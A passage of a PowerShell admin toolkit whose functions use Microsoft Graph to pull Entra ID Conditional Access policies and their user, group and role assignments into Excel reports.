    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    # Check if the Excel module is installed.
    if (Get-Module -ListAvailable -Name "ImportExcel") {
        # Do nothing.
    } else {
        Write-Error -Exception "The Excel PowerShell module is not installed. Please, run 'Install-Module ImportExcel -Force' as an admin and try again." -ErrorAction Stop
    }


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule -Verbose


    # Connect to Microsoft Graph.
    Connect-DCMsGraphAsUser -Scopes 'Policy.Read.ConditionalAccess', 'Application.Read.All', 'Policy.Read.All', 'Directory.Read.All' -Verbose


    # Export all Conditional Access policies from Microsoft Graph as JSON.
    Write-Verbose -Verbose -Message "Generating Conditional Access policy design report..."
    
    # Fetch conditional access policies.
    Write-Verbose -Verbose -Message "Getting all Conditional Access policies..."
    $CAPolicies = (Invoke-MgGraphRequest -Method GET -Uri 'https://graph.microsoft.com/beta/identity/conditionalAccess/policies').value | ConvertTo-Json -Depth 10 | ConvertFrom-Json

    # Fetch service principals for id translation.
    $EnterpriseApps = Get-MgServicePrincipal

    # Fetch roles for id translation.
    $EntraIDRoles =  Get-MgDirectoryRoleTemplate | Select-Object DisplayName, Description, Id | Sort-Object DisplayName


    # Format the result.
    $Result = foreach ($Policy in $CAPolicies) {
        $CustomObject = New-Object -TypeName psobject


        # displayName
        $CustomObject | Add-Member -MemberType NoteProperty -Name "displayName" -Value (Out-String -InputObject $Policy.displayName)


        # state
        $CustomObject | Add-Member -MemberType NoteProperty -Name "state" -Value (Out-String -InputObject $Policy.state)


        # includeUsers
        $Users = foreach ($User in $Policy.conditions.users.includeUsers) {
            if ($User -ne 'All' -and $User -ne 'GuestsOrExternalUsers' -and $User -ne 'None') {
                (Get-MgUser -Filter "id eq '$User'").userPrincipalName
            }
            else {
                $User
            }
        }

        $CustomObject | Add-Member -MemberType NoteProperty -Name "includeUsers" -Value (Out-String -InputObject $Users)


        # excludeUsers
        $Users = foreach ($User in $Policy.conditions.users.excludeUsers) {
            if ($User -ne 'All' -and $User -ne 'GuestsOrExternalUsers' -and $User -ne 'None') {
                (Get-MgUser -Filter "id eq '$User'").userPrincipalName
            }
            else {
                $User
            }
        }

        $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeUsers" -Value (Out-String -InputObject $Users)


        # includeGroups
        $Groups = foreach ($Group in $Policy.conditions.users.includeGroups) {
            if ($Group -ne 'All' -and $Group -ne 'None') {
                (Get-MgGroup -Filter "id eq '$Group'").DisplayName
            }
            else {
                $Group
            }
        }

        $CustomObject | Add-Member -MemberType NoteProperty -Name "includeGroups" -Value (Out-String -InputObject $Groups)


        # excludeGroups
        $Groups = foreach ($Group in $Policy.conditions.users.excludeGroups) {
            if ($Group -ne 'All' -and $Group -ne 'None') {
                (Get-MgGroup -Filter "id eq '$Group'").DisplayName
            }
            else {
                $Group
            }
        }

        $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeGroups" -Value (Out-String -InputObject $Groups)


        # includeRoles
        $Roles = foreach ($Role in $Policy.conditions.users.includeRoles) {
            if ($Role -ne 'None' -and $Role -ne 'All') {
                $RoleToCheck = ($EntraIDRoles | Where-Object { $_.Id -eq $Role }).displayName

                if ($RoleToCheck) {
                    $RoleToCheck
                }
                else {
                    $Role
                }
            }
            else {
                $Role
            }
        }

        $CustomObject | Add-Member -MemberType NoteProperty -Name "includeRoles" -Value (Out-String -InputObject $Roles)


        # excludeRoles
        $Roles = foreach ($Role in $Policy.conditions.users.excludeRoles) {
            if ($Role -ne 'None' -and $Role -ne 'All') {
                $RoleToCheck = ($EntraIDRoles | Where-Object { $_.Id -eq $Role }).displayName

                if ($RoleToCheck) {
                    $RoleToCheck
                }
                else {
                    $Role
                }
            }
            else {
                $Role
            }
        }

        $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeRoles" -Value (Out-String -InputObject $Roles)


        # AppId
        $Applications = foreach ($Application in $Policy.conditions.applications.AppId) {
            if ($Application -ne 'None' -and $Application -ne 'All' -and $Application -ne 'Office365') {
                ($EnterpriseApps | Where-Object { $_.AppId -eq $Application }).displayName
            }
            else {
                $Application
            }
        }

        $CustomObject | Add-Member -MemberType NoteProperty -Name "AppId" -Value (Out-String -InputObject $Applications)


        # excludeApplications
        $Applications = foreach ($Application in $Policy.conditions.applications.excludeApplications) {
            if ($Application -ne 'None' -and $Application -ne 'All' -and $Application -ne 'Office365') {
                ($EnterpriseApps | Where-Object { $_.AppId -eq $Application }).displayName
            }
            else {
                $Application
            }
        }

        $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeApplications" -Value (Out-String -InputObject $Applications)


        # includeUserActions
        $CustomObject | Add-Member -MemberType NoteProperty -Name "includeUserActions" -Value (Out-String -InputObject $Policy.conditions.applications.includeUserActions)


        # userRiskLevels
        $CustomObject | Add-Member -MemberType NoteProperty -Name "userRiskLevels" -Value (Out-String -InputObject $Policy.conditions.userRiskLevels)


        # signInRiskLevels
        $CustomObject | Add-Member -MemberType NoteProperty -Name "signInRiskLevels" -Value (Out-String -InputObject $Policy.conditions.signInRiskLevels)


        # includePlatforms
        $CustomObject | Add-Member -MemberType NoteProperty -Name "includePlatforms" -Value (Out-String -InputObject $Policy.conditions.platforms.includePlatforms)


        # excludePlatforms
        $CustomObject | Add-Member -MemberType NoteProperty -Name "excludePlatforms" -Value (Out-String -InputObject $Policy.conditions.platforms.excludePlatforms)


        # clientAppTypes
        $CustomObject | Add-Member -MemberType NoteProperty -Name "clientAppTypes" -Value (Out-String -InputObject $Policy.conditions.clientAppTypes)


        # includeLocations
        $includeLocations = foreach ($includeLocation in $Policy.conditions.locations.includeLocations) {
            if ($includeLocation -ne 'All' -and $includeLocation -ne 'AllTrusted' -and $includeLocation -ne '00000000-0000-0000-0000-000000000000') {
                (Get-MgIdentityConditionalAccessNamedLocation -Filter "Id eq '$includeLocation'").DisplayName
            }
            elseif ($includeLocation -eq '00000000-0000-0000-0000-000000000000') {
                'MFA Trusted IPs'
            }
            else {
                $includeLocation
            }
        }

        $CustomObject | Add-Member -MemberType NoteProperty -Name "includeLocations" -Value (Out-String -InputObject $includeLocations)


        # excludeLocation
        $excludeLocations = foreach ($excludeLocation in $Policy.conditions.locations.excludeLocations) {
            if ($excludeLocation -ne 'All' -and $excludeLocation -ne 'AllTrusted' -and $excludeLocation -ne '00000000-0000-0000-0000-000000000000') {
                (Get-MgIdentityConditionalAccessNamedLocation -Filter "Id eq '$includeLocation'").DisplayName
            }
            elseif ($excludeLocation -eq '00000000-0000-0000-0000-000000000000') {
                'MFA Trusted IPs'
            }
            else {
                $excludeLocation
            }
        }


        # excludeLocations
        $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeLocations" -Value (Out-String -InputObject $excludeLocations)


        # grantControls
        $CustomObject | Add-Member -MemberType NoteProperty -Name "grantControls" -Value (Out-String -InputObject $Policy.grantControls.builtInControls)


        # termsOfUse
        $TermsOfUses = foreach ($TermsOfUse in $Policy.grantControls.termsOfUse) {
            $GraphUri = "https://graph.microsoft.com/v1.0/agreements/$TermsOfUse"
            (Get-MgAgreement | where Id -eq $TermsOfUse).displayName
        }
        
        $CustomObject | Add-Member -MemberType NoteProperty -Name "termsOfUse" -Value (Out-String -InputObject $TermsOfUses)


        # operator
        $CustomObject | Add-Member -MemberType NoteProperty -Name "operator" -Value (Out-String -InputObject $Policy.grantControls.operator)


        # sessionControlsapplicationEnforcedRestrictions
        $CustomObject | Add-Member -MemberType NoteProperty -Name "sessionControlsapplicationEnforcedRestrictions" -Value (Out-String -InputObject $Policy.sessionControls.applicationEnforcedRestrictions.isEnabled)


        # sessionControlscloudAppSecurity
        $CustomObject | Add-Member -MemberType NoteProperty -Name "sessionControlscloudAppSecurity" -Value (Out-String -InputObject $Policy.sessionControls.cloudAppSecurity.isEnabled)


        # sessionControlssignInFrequency
        $CustomObject | Add-Member -MemberType NoteProperty -Name "sessionControlssignInFrequency" -Value (Out-String -InputObject $Policy.sessionControls.signInFrequency)


        # sessionControlspersistentBrowser
        $CustomObject | Add-Member -MemberType NoteProperty -Name "sessionControlspersistentBrowser" -Value (Out-String -InputObject $Policy.sessionControls.persistentBrowser)


        # Return object.
        $CustomObject
    }


    # Export the result to Excel.
    Write-Verbose -Verbose -Message "Exporting report to Excel..."
    $Path = "$((Get-Location).Path)\Conditional Access Policy Design Report $(Get-Date -Format 'yyyy-MM-dd').xlsx"
    $Result | Export-Excel -Path $Path -WorksheetName "CA Policies" -BoldTopRow -FreezeTopRow -AutoFilter -AutoSize -ClearSheet -Show


    Write-Verbose -Verbose -Message "Saved $Path"
    Write-Verbose -Verbose -Message "Done!"
}



function New-DCConditionalAccessAssignmentReport {
    <#
        .SYNOPSIS
            Automatically generate an Excel report containing your current Conditional Access assignments.

        .DESCRIPTION
            Uses Microsoft Graph to fetch all Conditional Access policy assignments, both group- and user assignments (for now, it doesn't support role assignments). It exports them to Excel in a nicely formatted report for your filtering and analysing needs. If you include the -IncludeGroupMembers parameter, members of assigned groups will be included in the report as well (of course, this can produce very large reports if you have included large groups in your policy assignments).

            The purpose of the report is to give you an overview of how Conditional Access policies are currently applied in an Entra ID tenant, and which users are targeted by which policies.

            The report does not include information about the policies themselves. Use New-DCConditionalAccessPolicyDesignReport for that task.

            The CMDlet also uses the PowerShell Excel Module for the export to Excel. You can install this module with:
            Install-Module ImportExcel -Force

            The report is exported to Excel and will automatically open. In Excel, please do this:
            1. Select all cells.
            2. Click on "Wrap Text".
            3. Click on "Top Align".

            The report is now easier to read.

            More information can be found here: https://danielchronlund.com/2020/10/20/export-your-conditional-access-policy-assignments-to-excel/
            
        .PARAMETER IncludeGroupMembers
            If you include the -IncludeGroupMembers parameter, members of assigned groups will be included in the report as well (of course, this can produce a very large report if you have included large groups in your policy assignments).
            
        .INPUTS
            None

        .OUTPUTS
            Excel report with all Conditional Access aassignments.

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            New-DCConditionalAccessAssignmentReport
        
        .EXAMPLE
            New-DCConditionalAccessAssignmentReport -IncludeGroupMembers
    #>



    # ----- [Initialisations] -----

    # Script parameters.
    param (
        [parameter(Mandatory = $false)]
        [switch]$IncludeGroupMembers
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check if the Excel module is installed.
    if (Get-Module -ListAvailable -Name "ImportExcel") {
        # Do nothing.
    }
    else {
        Write-Error -Exception "The Excel PowerShell module is not installed. Please, run 'Install-Module ImportExcel -Force' as an admin and try again." -ErrorAction Stop
    }


    # Connect to Microsoft Graph.
    Write-Verbose -Verbose -Message "Connecting to Microsoft Graph..."
    if (!($AccessToken)) {
        $AccessToken = Invoke-DCEntraIDDeviceAuthFlow -ReturnAccessTokenInsteadOfRefreshToken
    }


    # Get all Conditional Access policies.
    Write-Verbose -Verbose -Message "Getting all Conditional Access policies..."
    $GraphUri = 'https://graph.microsoft.com/beta/identity/conditionalAccess/policies'
    $CAPolicies = @(Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri)
    Write-Verbose -Verbose -Message "Found $(($CAPolicies).Count) policies..."


    # Get all group and user conditions from the policies.
    $CAPolicies = foreach ($Policy in $CAPolicies) {
        Write-Verbose -Verbose -Message "Getting assignments for policy $($Policy.displayName)..."
        $CustomObject = New-Object -TypeName psobject


        $CustomObject | Add-Member -MemberType NoteProperty -Name "displayName" -Value $Policy.displayName
        $CustomObject | Add-Member -MemberType NoteProperty -Name "state" -Value $Policy.state


        Write-Verbose -Verbose -Message "Getting include groups for policy $($Policy.displayName)..."
        $includeGroupsDisplayName = foreach ($Object in $Policy.conditions.users.includeGroups) {
            $GraphUri = "https://graph.microsoft.com/v1.0/groups/$Object"
            try {
                (Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri).displayName
            }
            catch {
                # Do nothing.
            }
        }
        
        $CustomObject | Add-Member -MemberType NoteProperty -Name "includeGroupsDisplayName" -Value $includeGroupsDisplayName
        $CustomObject | Add-Member -MemberType NoteProperty -Name "includeGroupsId" -Value $Policy.conditions.users.includeGroups


        Write-Verbose -Verbose -Message "Getting exclude groups for policy $($Policy.displayName)..."
        $excludeGroupsDisplayName = foreach ($Object in $Policy.conditions.users.excludeGroups) {
            $GraphUri = "https://graph.microsoft.com/v1.0/groups/$Object"
            try {
                (Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri).displayName
            }
            catch {
                # Do nothing.
            }
        }

        $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeGroupsDisplayName" -Value $excludeGroupsDisplayName
        $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeGroupsId" -Value $Policy.conditions.users.excludeGroups


        Write-Verbose -Verbose -Message "Getting include users for policy $($Policy.displayName)..."
        $includeUsersUserPrincipalName = foreach ($Object in $Policy.conditions.users.includeUsers) {
            if ($Object -ne "All" -and $Object -ne "GuestsOrExternalUsers" -and $Object -ne "None") {
                $GraphUri = "https://graph.microsoft.com/v1.0/users/$Object"
                try {
                    (Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri -ErrorAction "Continue").userPrincipalName
                }
                catch {
                    # Do nothing.
                }
            }
            else {
                $Object
            }
        }

        if ($Policy.conditions.users.includeUsers -ne "All" -and $Policy.conditions.users.includeUsers -ne "GuestsOrExternalUsers" -and $Policy.conditions.users.includeUsers -ne "None") {
            $CustomObject | Add-Member -MemberType NoteProperty -Name "includeUsersUserPrincipalName" -Value $includeUsersUserPrincipalName
            $CustomObject | Add-Member -MemberType NoteProperty -Name "includeUsersId" -Value $Policy.conditions.users.includeUsers
        }
        else {
            $CustomObject | Add-Member -MemberType NoteProperty -Name "includeUsersUserPrincipalName" -Value $Policy.conditions.users.includeUsers
            $CustomObject | Add-Member -MemberType NoteProperty -Name "includeUsersId" -Value $Policy.conditions.users.includeUsers
        }


        Write-Verbose -Verbose -Message "Getting exclude users for policy $($Policy.displayName)..."
        $excludeUsersUserPrincipalName = foreach ($Object in $Policy.conditions.users.excludeUsers) {
            if ($Object -ne "All" -and $Object -ne "GuestsOrExternalUsers" -and $Object -ne "None") {
                $GraphUri = "https://graph.microsoft.com/v1.0/users/$Object"
                try {
                    (Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri -ErrorAction "Continue").userPrincipalName
                }
                catch {
                    # Do nothing.
                }
            }
            else {
                $Object
            }
        }

        if ($Policy.conditions.users.excludeUsers -ne "All" -and $Policy.conditions.users.excludeUsers -ne "GuestsOrExternalUsers" -and $Policy.conditions.users.excludeUsers -ne "None") {
            $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeUsersUserPrincipalName" -Value $excludeUsersUserPrincipalName
            $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeUsersId" -Value $Policy.conditions.users.exludeUsers
        }
        else {
            $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeUsersUserPrincipalName" -Value $Policy.conditions.users.exludeUsers
            $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeUsersId" -Value $Policy.conditions.users.exludeUsers
        }


        Write-Verbose -Verbose -Message "Getting include roles for policy $($Policy.displayName)..."
        $includeRolesDisplayName = foreach ($Object in $Policy.conditions.users.includeRoles) {
            $GraphUri = "https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=$Object"
            $RoleInfo = Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri -ErrorAction SilentlyContinue
            
            if ($RoleInfo.displayName) {
                $RoleInfo.displayName
            }
            else {
                $Object
            }
        }
        
        $CustomObject | Add-Member -MemberType NoteProperty -Name "includeRolesDisplayName" -Value $includeRolesDisplayName
        $CustomObject | Add-Member -MemberType NoteProperty -Name "includeRolesId" -Value $Policy.conditions.users.includeRoles


        Write-Verbose -Verbose -Message "Getting exclude roles for policy $($Policy.displayName)..."
        $excludeRolesDisplayName = foreach ($Object in $Policy.conditions.users.excludeRoles) {
            $GraphUri = "https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=$Object"
            $RoleInfo = Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri -ErrorAction SilentlyContinue
            
            if ($RoleInfo.displayName) {
                $RoleInfo.displayName
            }
            else {
                $Object
            }
        }

        $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeRolesDisplayName" -Value $excludeRolesDisplayName
        $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeRolesId" -Value $Policy.conditions.users.excludeRoles


        $CustomObject
    }


    # Fetch include group members from Entra ID:
    $IncludeGroupMembersFromAd = @()
    if ($IncludeGroupMembers) {
        $IncludeGroupMembersFromAd = foreach ($Group in ($CAPolicies.includeGroupsId | Select-Object -Unique)) {
            Write-Verbose -Verbose -Message "Getting include group members for policy $($Policy.displayName)..."

            $GraphUri = "https://graph.microsoft.com/v1.0/groups/$Group"
            $GroupName = (Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri).displayName

            $GraphUri = "https://graph.microsoft.com/v1.0/groups/$Group/members"
            $Members = (Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri).userPrincipalName | Sort-Object userPrincipalName

            $CustomObject = New-Object -TypeName psobject
            $CustomObject | Add-Member -MemberType NoteProperty -Name "Group" -Value $GroupName
            $CustomObject | Add-Member -MemberType NoteProperty -Name "Members" -Value $Members
            $CustomObject
        }
    }


    # Fetch exclude group members from Entra ID:
    $ExcludeGroupMembersFromAd = @()
    if ($IncludeGroupMembers) {
        $ExcludeGroupMembersFromAd = foreach ($Group in ($CAPolicies.excludeGroupsId | Select-Object -Unique)) {
            Write-Verbose -Verbose -Message "Getting exclude group members for policy $($Policy.displayName)..."

            $GraphUri = "https://graph.microsoft.com/v1.0/groups/$Group"
            $GroupName = (Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri).displayName

            $GraphUri = "https://graph.microsoft.com/v1.0/groups/$Group/members"
            $Members = (Invoke-DCMsGraphQuery -AccessToken $AccessToken -GraphMethod 'GET' -GraphUri $GraphUri).userPrincipalName | Sort-Object userPrincipalName

            $CustomObject = New-Object -TypeName psobject
            $CustomObject | Add-Member -MemberType NoteProperty -Name "Group" -Value $GroupName
            $CustomObject | Add-Member -MemberType NoteProperty -Name "Members" -Value $Members
            $CustomObject
        }
    }


    # Get all group and user conditions from the policies.
    $Result = foreach ($Policy in $CAPolicies) {
        # Initiate custom object.
        $CustomObject = New-Object -TypeName psobject

        
        $CustomObject | Add-Member -MemberType NoteProperty -Name "displayName" -Value $Policy.displayName
        $CustomObject | Add-Member -MemberType NoteProperty -Name "state" -Value $Policy.state


        # Format include groups.
        [string]$includeGroups = foreach ($Group in ($Policy.includeGroupsDisplayName | Sort-Object)) {
            "$Group`r`n"
        }

        if ($includeGroups.Length -gt 1) {
            $includeGroups = $includeGroups.Substring(0, "$includeGroups".Length - 1)
        }

        [string]$includeGroups = [string]$includeGroups -replace "`r`n ", "`r`n"

        $CustomObject | Add-Member -MemberType NoteProperty -Name "includeGroups" -Value $includeGroups


        # Format include users.
        [string]$includeUsers = $Policy.includeUsersUserPrincipalName -replace " ", "`r`n"
        if ($includeUsers) {
            [string]$includeUsers += "`r`n" 
        }

        if ($IncludeGroupMembers) {
            [string]$includeUsers += foreach ($Group in $Policy.includeGroupsDisplayName) {
                [string](($includeGroupMembersFromAd | Where-Object { $_.Group -eq $Group }).Members | Sort-Object) -replace " ", "`r`n"
            }
        }

        $includeUsers = $includeUsers -replace " ", "`r`n"

        $CustomObject | Add-Member -MemberType NoteProperty -Name "includeUsers" -Value $includeUsers

        foreach ($User in ($Policy.includeUsersUserPrincipalName | Sort-Object)) {
            $includeUsers = "$includeUsers`r`n$User"
        }


        # Format include roles.
        [string]$includeRoles = foreach ($Role in ($Policy.includeRolesDisplayName | Sort-Object)) {
            "$Role`r`n"
        }

        if ($includeRoles.Length -gt 1) {
            $includeRoles = $includeRoles.Substring(0, "$includeRoles".Length - 1)
        }

        [string]$includeRoles = [string]$includeRoles -replace "`r`n ", "`r`n"

        $CustomObject | Add-Member -MemberType NoteProperty -Name "includeRoles" -Value $includeRoles


        # Format exclude groups.
        [string]$excludeGroups = foreach ($Group in ($Policy.excludeGroupsDisplayName | Sort-Object)) {
            "$Group`r`n"
        }

        if ($excludeGroups.Length -gt 1) {
            $excludeGroups = $excludeGroups.Substring(0, "$excludeGroups".Length - 1)
        }

        [string]$excludeGroups = [string]$excludeGroups -replace "`r`n ", "`r`n"

        $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeGroups" -Value $excludeGroups


        # Format exclude users.
        [string]$excludeUsers = $Policy.excludeUsersUserPrincipalName -replace " ", "`r`n"
        if ($excludeUsers) {
            [string]$excludeUsers += "`r`n" 
        }

        if ($IncludeGroupMembers) {
            [string]$excludeUsers += foreach ($Group in $Policy.excludeGroupsDisplayName) {
                [string](($ExcludeGroupMembersFromAd | Where-Object { $_.Group -eq $Group }).Members | Sort-Object) -replace " ", "`r`n"
            }
        }

        $excludeUsers = $excludeUsers -replace " ", "`r`n"

        $CustomObject | Add-Member -MemberType NoteProperty -Name "excludeUsers" -Value $excludeUsers

        foreach ($User in ($Policy.excludeUsersUserPrincipalName | Sort-Object)) {
            $excludeUsers = "$excludeUsers`r`n$User"
        }


        # Format exlude roles.
        [string]$exludeRoles = foreach ($Role in ($Policy.excludeRolesDisplayName | Sort-Object)) {
            "$Role`r`n"
        }

        if ($exludeRoles.Length -gt 1) {
            $exludeRoles = $exludeRoles.Substring(0, "$exludeRoles".Length - 1)
        }

        [string]$exludeRoles = [string]$exludeRoles -replace "`r`n ", "`r`n"

        $CustomObject | Add-Member -MemberType NoteProperty -Name "exludeRoles" -Value $exludeRoles


        # Output the result.
        $CustomObject
    }


    # Export the result to Excel.
    Write-Verbose -Verbose -Message "Exporting report to Excel..."
    $Path = "$((Get-Location).Path)\Conditional Access Assignment Report $(Get-Date -Format 'yyyy-MM-dd').xlsx"
    $Result | Export-Excel -Path $Path -WorksheetName "CA Assignments" -BoldTopRow -FreezeTopRow -AutoFilter -AutoSize -ClearSheet -Show


    Write-Verbose -Verbose -Message "Saved $Path"
    Write-Verbose -Verbose -Message "Done!"


    # ----- [End] -----
}
